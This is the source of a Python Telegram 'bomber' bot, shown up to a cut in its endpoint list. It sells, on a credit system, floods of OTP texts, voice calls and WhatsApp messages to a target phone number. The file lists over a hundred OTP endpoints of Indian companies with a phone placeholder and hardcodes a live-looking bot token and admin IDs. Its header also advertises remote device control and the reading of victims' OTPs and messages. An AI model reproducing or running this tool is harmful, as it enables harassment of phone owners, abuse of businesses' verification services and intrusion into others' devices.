# bomber_bot.py
# ─────────────────────────────────────────────────────────────
# Unified Telegram Bot — FULL REWRITE
#   ▸ SMS Bomber      — 1 credit/min, 500 credits lifetime
#   ▸ Firebase Blast  — real device control (babuji panel)
#   ▸ Test Slots      — Test ID 1 / Test ID 2 (per-device fire)
#   ▸ Per-device Msgs — view all OTPs and messages from any device
# Requirements:  pip install aiogram aiohttp
# ─────────────────────────────────────────────────────────────

import asyncio
import aiohttp
import aiohttp.web
import base64
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
import re
import sys

from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile,
)

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
BOT_TOKEN = "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI"
DB_PATH   = os.getenv("DB_PATH", "bomber_bot.db")
LOG_PATH  = os.getenv("LOG_PATH", "bomber_bot.log")
ADMIN_IDS_ENV = {5851573541, 45767764855}
PORT      = int(os.getenv("PORT", "10000"))
ADMIN_CONTACT = "@sanjipro5"

DEFAULT_COST_PER_MIN   = 1
DEFAULT_LIFETIME_COST  = 500
DEFAULT_COOLDOWN       = 5
DEFAULT_CONCURRENCY    = 500
DEFAULT_PER_HOST_CAP   = 30
DEFAULT_DAILY_BONUS    = 5
REFERRAL_BONUS         = 3
API_FAIL_THRESHOLD     = 10
LOG_RETENTION_DAYS     = 30
DEFAULT_COIN_COST      = 1
FIREBASE_SCAN_BUDGET   = 500
FIREBASE_OTP_BUDGET    = 200
HTTP_TIMEOUT_TOTAL     = 12
HTTP_TIMEOUT_CONNECT   = 5
USER_AGENT             = ("Mozilla/5.0 (Linux; Android 13; SM-S911B) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/122.0.0.0 Mobile Safari/537.36")
START_TIME             = int(time.time())

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_PATH, encoding="utf-8"),
    ],
)
log = logging.getLogger("bomber")

# ─────────────────────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_conn.row_factory = sqlite3.Row
for pragma in ("journal_mode=WAL", "synchronous=NORMAL", "busy_timeout=30000"):
    try:
        _conn.execute(f"PRAGMA {pragma}")
    except Exception:
        pass


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one":
            return cur.fetchone()
        if fetch == "all":
            return cur.fetchall()
        return cur.lastrowid


def _col_exists(table, col):
    cur = _conn.execute(f"PRAGMA table_info({table})")
    return any(row["name"] == col for row in cur.fetchall())


# ─────────────────────────────────────────────────────────────
# MASTER ENDPOINTS
# ─────────────────────────────────────────────────────────────
MASTER_ENDPOINTS = [
    ("call:TataCapitalVoice", "call", "POST",
     "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "isOtpViaCallAtLogin": "true"}),
    ("call:SwiggyCall", "call", "POST",
     "https://profile.swiggy.com/api/v3/app/request_call_verification",
     {"Content-Type": "application/json; charset=utf-8"},
     {"mobile": "{target}"}),
    ("call:MMTVoice", "call", "POST",
     "https://www.makemytrip.com/api/4/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:GoibiboVoice", "call", "POST",
     "https://www.goibibo.com/user/voice-otp/generate/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:MyntraVoice", "call", "POST",
     "https://www.myntra.com/gw/mobile-auth/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:FlipkartVoice", "call", "POST",
     "https://www.flipkart.com/api/6/user/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:AmazonVoice", "call", "POST",
     "https://www.amazon.in/ap/signin",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "action": "voice-otp"}),
    ("call:PaytmVoice", "call", "POST",
     "https://accounts.paytm.com/signin/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:ZomatoVoice", "call", "POST",
     "https://www.zomato.com/php/o2_api_handler.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&type=voice"),
    ("call:OlaVoice", "call", "POST",
     "https://api.olacabs.com/v1/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:UberVoice", "call", "POST",
     "https://auth.uber.com/v2/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:ApolloCall", "call", "POST",
     "https://apigateway.apollo247.in/auth-service/getOTPOnCall",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:1MGVoice", "call", "POST",
     "https://www.1mg.com/auth_api/v6/create_token",
     {"Content-Type": "application/json; charset=utf-8"},
     {"number": "{target}", "otp_on_call": True}),
    ("call:DoubtnutCall", "call", "POST",
     "https://micro.doubtnut.com/otp/send-call",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:SnitchVoice", "call", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/voice",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),

    ("wa:KPNWhatsApp", "whatsapp", "POST",
     "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     {"Content-Type": "application/json; charset=UTF-8",
      "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"},
     {"notification_channel": "WHATSAPP",
      "phone_number": {"country_code": "+91", "number": "{target}"}}),
    ("wa:JockeyWhatsApp", "whatsapp", "GET",
     "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{target}?whatsapp=true",
     {}, None),
    ("wa:FoxyWhatsApp", "whatsapp", "POST",
     "https://www.foxy.in/api/v2/users/send_otp",
     {"Content-Type": "application/json"},
     {"user": {"phone_number": "+91{target}"}, "via": "whatsapp"}),
    ("wa:StratzyWhatsApp", "whatsapp", "POST",
     "https://stratzy.in/api/web/whatsapp/sendOTP",
     {"Content-Type": "application/json"},
     {"phoneNo": "{target}"}),
    ("wa:RappiWhatsApp", "whatsapp", "POST",
     "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
     {"Content-Type": "application/json; charset=utf-8"},
     {"country_code": "+91", "phone": "{target}"}),
    ("wa:EkaCareWhatsApp", "whatsapp", "POST",
     "https://auth.eka.care/auth/init",
     {"Content-Type": "application/json"},
     {"phone": "+91{target}", "channel": "whatsapp"}),

    ("sms:LenskartSMS", "sms", "POST",
     "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     {"Content-Type": "application/json"},
     {"phoneCode": "+91", "telephone": "{target}"}),
    ("sms:NoBrokerSMS", "sms", "POST",
     "https://www.nobroker.in/api/v3/account/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&countryCode=IN"),
    ("sms:PharmEasySMS", "sms", "POST",
     "https://pharmeasy.in/api/v2/auth/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:WakefitSMS", "sms", "POST",
     "https://api.wakefit.co/api/consumer-sms-otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:ByjusSMS", "sms", "POST",
     "https://api.byjus.com/v2/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:HungamaOTP", "sms", "POST",
     "https://communication.api.hungama.com/v1/communication/otp",
     {"Content-Type": "application/json"},
     {"mobileNo": "{target}", "countryCode": "+91", "appCode": "un",
      "messageId": "1", "device": "web"}),
    ("sms:ServeTel", "sms", "POST",
     "https://api.servetel.in/v1/auth/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "_raw=mobile_number={target}"),

    ("legacy:FreeFireBomber", "legacy", "GET",
     "https://freefire-api.ct.ws/bomber4.php?phone={target}&duration=10",
     {}, None),
    ("legacy:Hotstar", "legacy", "PUT",
     "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
     {"Content-Type": "application/json",
      "x-hs-platform": "PCTV", "x-country-code": "IN",
      "origin": "https://www.hotstar.com"},
     {"phone_number": "{target}", "country_prefix": "91"}),
    ("legacy:AltBalaji", "legacy", "POST",
     "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
     {"Content-Type": "application/json",
      "origin": "https://www.altbalaji.com"},
     {"phone_number": "{target}", "country_code": "91", "platform": "web"}),
    ("legacy:Voot", "legacy", "POST",
     "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://www.voot.com"},
     {"type": "mobile", "mobile": "{target}", "countryCode": "+91"}),
    ("legacy:SonyLIV", "legacy", "POST",
     "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
     {"Content-Type": "application/json", "app_version": "3.1.42.3",
      "origin": "https://www.sonyliv.com"},
     {"mobileNumber": "{target}", "channelPartnerID": "MSMIND", "country": "IN"}),
    ("legacy:Ullu", "legacy", "POST",
     "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={target}",
     {"origin": "https://ullu.app"}, None),
    ("legacy:Zee5", "legacy", "GET",
     "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={target}",
     {"origin": "https://www.zee5.com"}, None),
    ("legacy:Snapdeal", "legacy", "POST",
     "https://m.snapdeal.com/signupCompleteAjax",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null"
     "&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"),
    ("legacy:SnapdealSendOTP", "legacy", "POST",
     "https://m.snapdeal.com/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:FlipkartSMS", "legacy", "POST",
     "https://1.rome.api.flipkart.com/1/action/view",
     {"Content-Type": "application/json",
      "origin": "https://www.flipkart.com"},
     {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY",
                               "loginIdPrefix": "+91", "loginId": "{target}",
                               "loginType": "MOBILE",
                               "verificationType": "OTP",
                               "screenName": "LOGIN_V4_MOBILE",
                               "sourceContext": "DEFAULT"}}),
    ("legacy:FlipkartImage", "legacy", "GET",
     "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
     {"referer": "https://www.flipkart.com/login/verify?loginIdentifier={target}"},
     None),
    ("legacy:Shopsy", "legacy", "POST",
     "https://www.shopsy.in/api/1/action/view",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:Samsung", "legacy", "POST",
     "https://www.samsung.com/in/api/v1/sso/otp/init",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:AjioSendOTP", "legacy", "POST",
     "https://login.web.ajio.com/api/auth/signupSendOTP",
     {"Content-Type": "application/json"},
     {"firstName": "Test User", "login": "test@example.com",
      "password": "TestPass123", "genderType": "",
      "mobileNumber": "{target}", "requestType": "SENDOTP"}),
    ("legacy:AjioAccountCheck", "legacy", "POST",
     "https://login.web.ajio.com/api/auth/accountCheck",
     {"Content-Type": "application/json",
      "origin": "https://www.ajio.com"},
     {"emailId": "test@example.com"}),
    ("legacy:MyntraLogin", "legacy", "POST",
     "https://www.myntra.com/gateway/v2/user/otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:BigBasket", "legacy", "POST",
     "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     {"Content-Type": "application/json", "x-channel": "BB-PWA",
      "origin": "https://www.bigbasket.com"},
     {"identifier": "{target}"}),
    ("legacy:Cilory", "legacy", "POST",
     "https://www.cilory.com/app/w/auth/soft",
     {"Content-Type": "application/json;charset=UTF-8"},
     {"mobile": "{target}"}),
    ("legacy:Limeroad", "legacy", "POST",
     "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&mobileOnly=false",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D"
     "&user_id={target}"),
    ("legacy:LimeroadResend", "legacy", "POST",
     "https://www.limeroad.com/auth/resend_otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:MyImagineStore", "legacy", "POST",
     "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile={target}"),
    ("legacy:Cossouq", "legacy", "POST",
     "https://www.cossouq.com/mobilelogin/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobilenumber={target}&otptype=register"),
    ("legacy:Shemaroome", "legacy", "POST",
     "https://www.shemaroome.com/users/resend_otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile_no=%2B91{target}"),
    ("legacy:Banggood", "legacy", "POST",
     "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://m.banggood.in"},
     "_raw=mobilePhone={target}&countryPhoneCode=91&type=1&verifyCode=KmUu"),
    ("legacy:FBBOnline", "legacy", "POST",
     "https://www.fbbonline.in/customer/account/GenerateOtp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb"
     "&RegistrationForm%5Bsignup_page%5D=1"
     "&RegistrationForm%5Bcontact_number%5D={target}"
     "&RegistrationForm%5Bvalid_mobile%5D=1"
     "&RegistrationForm%5Bemail%5D=test%40example.com"
     "&RegistrationForm%5Bvalid_email%5D=1"
     "&RegistrationForm%5Bfirst_name%5D=Test"
     "&RegistrationForm%5Blast_name%5D=User"
     "&RegistrationForm%5Bpassword%5D=TestPass123"
     "&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="),
    ("legacy:Grofers", "legacy", "POST",
     "https://grofers.com/v2/accounts/",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://grofers.com", "app_client": "consumer_web"},
     "_raw=user_phone={target}"),
    ("legacy:Snapmint", "legacy", "POST",
     "https://api.snapmint.com/v1/public/sign_up",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:DealShare", "legacy", "POST",
     "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hashCode": "k387IsBaTmn",
      "resendOtp": True, "app": "dealshare",
      "loginType": "8a18d60e0029e806"}),
    ("legacy:RentoMojo", "legacy", "POST",
     "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:NoBroker", "legacy", "POST",
     "https://www.nobroker.in/api/v3/account/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&countryCode=IN"),
    ("legacy:Housing", "legacy", "POST",
     "https://login.housing.com/api/v2/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country_url_name": "in"}),
    ("legacy:HousingGQL", "legacy", "POST",
     "https://mightyzeus.housing.com/api/gql",
     {"Content-Type": "application/json"},
     {"query": "mutation {sendOtp(phone: \"{target}\") {success}}"}),
    ("legacy:Swipe", "legacy", "POST",
     "https://app.getswipe.in/api/user/mobile_login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "resend": True}),
    ("legacy:Moglix", "legacy", "POST",
     "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "buildVersion": "24.0", "p": "android"}),
    ("legacy:CountryDelight", "legacy", "POST",
     "https://api.countrydelight.in/api/v1/customer/requestOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "platform": "Android", "mode": "new_user"}),
    ("legacy:WellnessForever", "legacy", "POST",
     "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=method=firstRegisterApi&data="
     "%7B%22customerMobile%22%3A%22{target}%22%2C%22generateOtp%22%3A%22true%22%7D"),
    ("legacy:LifestyleStores", "legacy", "POST",
     "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
     {"Content-Type": "application/json"},
     {"signInMobile": "{target}", "channel": "sms"}),
    ("legacy:Smytten", "legacy", "POST",
     "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "email": "test@example.com"}),
    ("legacy:CaratLane", "legacy", "POST",
     "https://www.caratlane.com/cg/dhevudu",
     {"Content-Type": "application/json"},
     {"query": "mutation {SendOtp(input: {mobile: \"{target}\","
               "isdCode: \"91\",otpType: \"registerOtp\"}) "
               "{status {message code}}}"}),
    ("legacy:Spencer", "legacy", "POST",
     "https://jiffy.spencers.in/user/auth/otp/send",
     {"Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"},
     {"phone": "{target}"}),
    ("legacy:ShoppersStop", "legacy", "POST",
     "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "loginType": "SIGNIN_WITH_MOBILE"}),
    ("legacy:Brevistay", "legacy", "POST",
     "https://www.brevistay.com/cst/app-api/login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:Flomattress", "legacy", "POST",
     "https://cod.flomattress.com/api/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://www.flomattress.com"},
     "_raw=number={target}&store=hushbedding.myshopify.com"),
    ("legacy:Coolwinks", "legacy", "GET",
     "https://api.coolwinks.com/api/accounts/is_already_registered/?username={target}",
     {"origin": "https://www.coolwinks.com"}, None),
    ("legacy:Cansell", "legacy", "POST",
     "https://webapi.cansell.in/api/User/SignUp",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://m.cansell.in"},
     {"name": "Test", "surname": "User", "email": "test@example.com",
      "phone": "{target}", "password": "test1234"}),
    ("legacy:MoreRetail", "legacy", "POST",
     "https://omni-api.moreretail.in/api/v1/login/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:UrbanClap", "legacy", "POST",
     "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://www.urbancompany.com"},
     {"country_id": "IND",
      "phone": {"isd_code": "+91", "phone_wo_isd": "{target}"},
      "device_type": "customer"}),
    ("legacy:Paytm", "legacy", "POST",
     "https://accounts.paytm.com/v2/api/register",
     {"Content-Type": "application/json",
      "origin": "https://accounts.paytm.com"},
     {"email": "", "mobile": "{target}", "loginPassword": "Pura@1090",
      "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
      "redirectUri": "https://paytm.com/v1/api/authresponse",
      "clientId": "paytm-web-secure", "scope": "paytm", "state": "",
      "responseType": "code", "theme": "mp-html5", "dob_agreement": True}),
    ("legacy:LendingPlate", "legacy", "POST",
     "https://lendingplate.com/api.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobiles={target}&resend=Resend"),
    ("legacy:MPokket", "legacy", "POST",
     "https://web-api.mpokket.in/registration/sendOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:NuvamaWealth", "legacy", "POST",
     "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:MyHubble", "legacy", "POST",
     "https://api.myhubble.money/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phoneNumber": "{target}", "channel": "SMS"}),
    ("legacy:TataCapitalBiz", "legacy", "POST",
     "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}", "deviceOs": "Android",
      "sourceName": "MitayeFaasleWebsite", "isOdFlow": "no",
      "deviceInfo": "Windows Web Browser"}),
    ("legacy:TataMotors", "legacy", "POST",
     "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "locationUrl": "https://cars.tatamotors.com",
      "reqBody": "sendOtp"}),
    ("legacy:GoKwik", "legacy", "POST",
     "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country": "in"}),
    ("legacy:PayMeIndia", "legacy", "POST",
     "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "uniqueReferCode": "S10ePIIrbH3"}),
    ("legacy:Univest", "legacy", "GET",
     "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={target}",
     {}, None),
    ("legacy:Revv", "legacy", "POST",
     "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "deviceType": "website", "appVersion": "1.0"}),
    ("legacy:GetInstaCash", "legacy", "POST",
     "https://getinstacash.in/sell/getData.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=type=sendOTP&mobile={target}"),
    ("legacy:Ogonn", "legacy", "POST",
     "https://ogonn.in/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={target}"),
    ("legacy:Kotak1", "legacy", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=cust_full_name=Test+User&cust_email=test%40example.com"
     "&cust_mobile={target}&cust_political_disclaimer=Yes"
     "&cust_fatca_disclaimer=Yes"),
    ("legacy:Kotak2", "legacy", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
     {"X-Requested-With": "XMLHttpRequest"}, None),
    ("legacy:AngelBroking", "legacy", "POST",
     "https://www.angelbroking.com/form-gateways/oda-form.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=name=Test+User&mobile={target}&city=pune&web_placement_id=21"
     "&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"),
    ("legacy:Vedantu", "legacy", "POST",
     "https://user.vedantu.com/user/preLoginVerification",
     {"Content-Type": "application/json"},
     {"email": None, "phoneCode": "+91", "phoneNumber": "{target}", "ver": "11.345"}),
    ("legacy:Unacademy", "legacy", "POST",
     "https://unacademy.com/api/v3/user/user_check/",
     {"Content-Type": "application/json", "authorization": "Bearer undefined"},
     {"phone": "{target}", "country_code": "IN", "otp_type": 1,
      "email": "", "send_otp": True, "is_un_teach_user": False}),
    ("legacy:Byjus", "legacy", "POST",
     "https://bcas-prod.byjusweb.com/api/send-otp",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://byjus.com"},
     "_raw=phoneNumber={target}&page=free-trial-classes"),
    ("legacy:Cuemath", "legacy", "POST",
     "https://www.cuemath.com/api/v4/parents/",
     {"Content-Type": "application/json"},
     {"intl_mobile": {"phone": "{target}"},
      "notify": ["notify_on_whatsapp"], "phone": "{target}",
      "email": "test@example.com", "full_name": "Test User",
      "timezone": "Asia/Calcutta",
      "notify_through": "notify_on_whatsapp",
      "form_fields": "full_name,email,intl_mobile"}),
    ("legacy:DoubtnutV1", "legacy", "POST",
     "https://doubtnut.com/api/v1/user/login",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://doubtnut.com"},
     "_raw=phone={target}"),
    ("legacy:DoubtnutV4", "legacy", "POST",
     "https://api.doubtnut.com/v4/student/login",
     {"Content-Type": "application/json; charset=utf-8"},
     {"phone_number": "{target}", "language": "en"}),
    ("legacy:PenPencil", "legacy", "POST",
     "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "firstName": "test", "lastName": "user"}),
    ("legacy:PenPencilResend", "legacy", "POST",
     "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     {"Content-Type": "application/json; charset=utf-8"},
     {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{target}"}),
    ("legacy:Entri", "legacy", "POST",
     "https://entri.app/api/v3/users/check-phone/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:Cosmofeed", "legacy", "POST",
     "https://prod.api.cosmofeed.com/api/user/authenticate",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "emailId": "test@example.com", "version": "1.4.28"}),
    ("legacy:AakashAnthe", "legacy", "POST",
     "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     {"Content-Type": "application/json"},
     {"mobile_psid": "", "mobile_number": "{target}",
      "activity_type": "aakash-myadmission", "webengageData": "",
      "profile": "student", "whatsapp_opt_in": False}),
    ("legacy:AakashDigital1", "legacy", "POST",
     "https://digital.aakash.ac.in/mkt-signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}&otp=6230"),
    ("legacy:AakashDigital2", "legacy", "POST",
     "https://digital.aakash.ac.in/signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}"),
    ("legacy:WellAcademy", "legacy", "POST",
     "https://wellacademy.in/store/api/numberLoginV2",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"contact_no": "{target}"}),
    ("legacy:Careers360", "legacy", "POST",
     "https://www.careers360.com/ajax/no-cache/user/otp-send",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://www.careers360.com"},
     "_raw=mobile_number={target}&method=call&uid=12692588"),
    ("legacy:HealthMug", "legacy", "POST",
     "https://api.healthmug.com/account/createotp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:Apollo247", "legacy", "POST",
     "https://www.apollo247.com",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:Netmeds1", "legacy", "GET",
     "https://apiv2.netmeds.com/mst/rest/v1/id/details/?mobile={target}",
     {}, None),
    ("legacy:Netmeds2", "legacy", "GET",
     "https://m.netmeds.com/mst/rest/v1/id/details/{target}",
     {}, None),
    ("legacy:MedPlus", "legacy", "POST",
     "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://www.medplusmart.com"},
     "_raw=recieveUpdates=1&firstName=Test&lastName=User"
     "&emailId=test%40example.com&password=TestPass%24123"
     "&confirmpwd=TestPass%24123&mobileNumber={target}"
     "&SESSIONID=17C83B4A90182E8DA6F4F15755A43027"
     "&isCordova=false&isPhonepeSwitch=false"),
    ("legacy:Purplle", "legacy", "GET",
     "https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register",
     {"origin": "https://www.purplle.com"}, None),
    ("legacy:TrulyMadly", "legacy", "POST",
     "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:BetterHalf", "legacy", "POST",
     "https://api.betterhalf.ai/v2/auth/otp/send/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:Charzer", "legacy", "POST",
     "https://api.charzer.com/auth-service/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:Redbus", "legacy", "GET",
     "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined",
     {"origin": "https://m.redbus.in"}, None),
    ("legacy:Makemytrip", "legacy", "POST",
     "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
     {"Content-Type": "application/json",
      "origin": "https://www.makemytrip.com"},
     {"loginId": "{target}", "type": "MOBILE", "version": 2, "countryCode": "91"}),
    ("legacy:Oyo", "legacy", "POST",
     "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
     {"Content-Type": "text/plain;charset=UTF-8",
      "origin": "https://www.oyorooms.com"},
     {"phone": "{target}", "country_code": "+91", "nod": 4}),
    ("legacy:EasyMyTrip", "legacy", "POST",
     "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
     {"Content-Type": "application/json; charset=UTF-8",
      "origin": "https://mybookings.easemytrip.com"},
     {"emailph": "{target}"}),
    ("legacy:Happyeasygo", "legacy", "GET",
     "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}&verifycode=FDCA",
     {"x-device": "mobile", "origin": "https://m.happyeasygo.com"}, None),
